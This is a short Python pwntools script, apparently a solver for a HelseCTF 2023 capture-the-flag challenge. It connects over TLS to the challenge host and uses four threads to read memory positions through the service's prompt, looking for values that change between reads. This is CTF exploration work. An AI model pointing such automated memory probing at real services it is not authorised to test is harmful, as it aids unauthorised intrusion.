from pwn import *
from time import time_ns
import threading

def readPosition(io,pos):
    io.recvuntil(b"lese?") 
    io.sendline(f"{pos}".encode())
    data = io.recvuntil(b"\r\n", drop = True).decode().split()[-1]
    return data
    
def testRange(start, end):
    io = remote("helsectf2023-6ac4e1c6d8855c1bd96a-minnespekter.chals.io", 443, ssl=True)

    for i in range(start, end):
        data1 = readPosition(io, i)
        data2 = readPosition(io, 0)
        data3 = readPosition(io, i)
        if data1 != data3: 
            print(f"{i} - {data1} {data3}")
            print("Change!")
            break

end = 0x0001ffff #131071

# for i in range(10240, end, +1024):
t1 = threading.Thread(target=testRange, args=[90000,100000])
t1.start()
t2 = threading.Thread(target=testRange, args=[100000,110000])
t2.start()
t3 = threading.Thread(target=testRange, args=[110000,120000])
t3.start()
t4 = threading.Thread(target=testRange, args=[120000,131071])
t4.start()
# t5 = threading.Thread(target=testRange, args=[40000,50000])
# t5.start()
# t6 = threading.Thread(target=testRange, args=[50000,60000])
# t6.start()
# t7 = threading.Thread(target=testRange, args=[60000,70000])
# t7.start()
# t8 = threading.Thread(target=testRange, args=[70000,80000])
# t8.start()
# t9 = threading.Thread(target=testRange, args=[80000,90000])
# t9.start()
